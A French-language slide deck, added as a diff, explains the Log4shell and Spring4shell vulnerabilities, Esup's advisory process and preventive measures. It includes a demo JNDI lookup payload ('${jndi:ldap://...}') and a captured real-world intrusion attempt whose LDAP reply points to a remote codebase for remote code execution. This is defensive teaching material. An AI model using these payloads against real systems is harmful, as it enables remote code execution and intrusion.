@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html>
+  <head>
+   <meta http-equiv="Content-type" content="text/html;charset=UTF-8" >
+   <meta name="viewport" content="width=device-width, initial-scale=1">
+   <style>
+    html { font-family: Arial, sans-serif; font-size: 160%; margin: 1rem; }
+    small { font-size: 60%; }
+    ul { margin-top: 0; }    
+    h4 { margin-bottom: 1rem; }
+    h2 { border-bottom: 1px solid #0a71b4; }
+    li { margin: 0.5rem 0 0; }
+    pre { margin: 0; }
+    li pre code.hljs { padding-left: 0; padding-right: 0; }
+    i { color: #005cc5; }
+    li::marker { color: #e30f47; }
+    img { margin: 1rem; max-width: 90vw; }
+   </style>
+  </head>
+<body>
+
+<h1>Failles log4shell et spring4shell : explications et préventions</h1>
+
+<script>
+    document.title = document.querySelector('h1').innerText;
+</script>
+
+
+<h2>Log4shell</h2> <!-------------------------------------------------------->
+
+<p>Faille historique : « la vulnérabilité la plus importante et la plus critique de la dernière décennie »</p>
+<p>Score CVSS : <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-44228">10/10</a></p>
+
+
+<h3>Histoire</h3>
+
+<ul>
+    <li>24 novembre : Chen Zhaojun communique la faille à l'équipe log4j</li>
+    <li>8 décembre : Chen Zhaojun prévient l'équipe log4j que la vulnérabilité a fuité</li>
+    <li>9 décembre : <a href='https://logging.apache.org/log4j/2.x/security.html'>publication</a> un peu précipitée de la faille, car la page va encore beaucoup bouger</li>
+    <li>jusqu'au vendredi 10 décembre au soir, l'annonce affirme que les nouvelles versions de JDK protègent du RCE (cf <a href='https://web.archive.org/web/20211210213710/https://logging.apache.org/log4j/2.x/security.html'>ancienne page</a>)</li>
+    <li>jusqu'au samedi 11 décembre, la vulnérabilité de log4j 1.x n'était pas clair (<a href='https://github.com/apache/logging-log4j2/pull/608#issuecomment-990494126'>ref</a>)</li>
+</ul>
+
+Du côté de la coordination technique Esup, nous avons pu 
+<ul>
+    <li>reproduire la faille (grâce aux POC in the wild),</li>
+    <li>recenser les applications impactées,</li>
+    <li>puis faire un <a href='https://www.esup-portail.org/wiki/display/SECU/ESUP-2021-AVI-001+-+Log4shell'>avis de sécurité</a>.</li>
+</ul>
+
+
+<h3>La faille : de l'importance de l'escaping</h3>
+
+<p>Vous connaissez l'<a href='https://owasp.org/www-community/attacks/SQL_Injection'>injection SQL</a> ? l'<a href='https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#framework-security'>injection HTML</a> ?</p>
+
+Avec Log4j2, c'est l'injection via les <a href='https://logging.apache.org/log4j/2.x/manual/lookups.html'>lookups</a>. Exemple :
+<pre><code class="language-java">log.error("{}", "${env:PATH}");
+</code></pre>
+    est interprété en Log4j &lt; 2.15.0 !
+
+<p> =&gt; toute url loggant un param issu de GET/POST/headers est impactée.</p>
+
+<p>Combiné avec le <a href="https://logging.apache.org/log4j/2.x/manual/lookups.html#JndiLookup">lookup Jndi</a>, on obtient :</p>
+
+<img src='https://govcert.ch/blog/zero-day-exploit-targeting-popular-java-library-log4j/assets/log4j_attack.png'>
+
+<p>NB : il manque la solution "firewall" : empêcher les requêtes TCP sortantes</p>
+
+
+<h3>Démo</h3>
+
+<pre><code class="language-java">import org.apache.logging.log4j.LogManager;
+import org.apache.logging.log4j.Logger;
+
+public class log4j {
+    private static final Logger logger = LogManager.getLogger(log4j.class);   
+    public static void main(String[] args) {
+        logger.error("{}", "${jndi:ldap://127.0.0.1:1389/Exploit}");
+    }
+}
+</code></pre>
+
+<pre><code>% strace -econnect -f mvn compile exec:java -Dexec.mainClass=log4j
+[pid 73253] connect(108, {sa_family=AF_INET6, sin6_port=htons(1389), sin6_flowinfo=htonl(0), inet_pton(AF_INET6, "::ffff:127.0.0.1", &sin6_addr), sin6_scope_id=0}, 28) = -1 ECONNREFUSED (Connexion refusée)
+22:25:55.899 [log4j.main()] ERROR log4j - ${jndi:ldap://127.0.0.1:1389/Exploit}
+</code></pre>
+
+Une url LDAP d'une tentative d'intrusion à Rouen :
+
+<pre><code>% ldapsearch -x -H ldap://x41.me:1389//univ-rouen.fr/X-Forwarded-For
+#
+dn:
+javaClassName: foo
+javaCodeBase: http://6jqbezekifm5y87oc8kp56l3yu4rsg.burpcollaborator.net/
+objectClass: javaNamingReference
+javaFactory: Log4jRCE
+</code></pre>
+
+<p>Des outils existent pour démarrer un serveur LDAP qui renvoie ce qu'il faut au format attendu par Java : <a href='https://github.com/veracode-research/rogue-jndi'>exemple</a>...</p>
+
+
+<h3>A propos des libs de logs en Java</h3>
+
+En java, 3 librairies (implémentations) de logs sont principalement utilisées : log4j, log4j2 et logback.
+
+<ul>
+    <li>log4j est la librairie historique : elle est encore très utilisée. log4j est un projet distinct de log4j2</li>
+    <li>log4j tend à être remplacée par log4j2 ou slf4j+logback</li>
+</ul>
+
+<img src='https://www.slf4j.org/images/legacy.png'>
+<img src='log4j-slf4j.png'> (<a href='https://www.ralphgoers.com/post/getting-the-most-out-of-the-log4j-2-api'>source</a>)
+
+
+<h2>Fonctionnement des annonces de sécurité Esup</h2> <!-------------------------------------------------------->
+
+exemple avec Spring4shell :
+
+<ul>
+    <li>31 mars 2022 : </li>
+    <ul>
+        <li>réception de la faille</li>
+        <li>reproduction de l'exploit via des POC</li>
+        <li>reproduction de l'exploit sur esup-dematec</li>
+    </ul>
+    <li>1 avril 2022</li>
+    <ul>
+        <li>envoi d'un mail à esupdematec-devel@esup-portail.org</li>
+        <li>rédaction de l'<a href="https://www.esup-portail.org/wiki/display/SECU/ESUP-2022-AVI-001+-+CVE-2022-22965">avis de sécurité</a></li>
+        <li>envoi de l'avis à securite@esup-portail.org</li>
+        <li>envoi de l'avis à esup-utilisateurs@esup-portail.org</li>
+    </ul>
+</ul>
+
+
+
+<h2>Prévention</h2>
+
+<ul>
+    <li>gardez vos applications à jour <small>(ou pas /o\)</small></li>
+    <li>évitez que l'utilisateur exécutant Java ait les droits de modifier jsp/properties/class/...</li>
+    <li>empêchez les requêtes sortantes du serveur <small>(faire un "REJECT" et pas un "DROP" sinon le RCE devient un DoS)</small></li>
+</ul>
+
+
+
+
+<h2>Liens</h2> <!-------------------------------------------------------->
+
+
+<a href='https://groupes.renater.fr/sympa/info/hackesr'>Réseau Hackesr</a>
+
+
+<link rel="stylesheet" href="highlight/styles/github.min.css">
+<script src="highlight/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+
+
+
+</body></html>
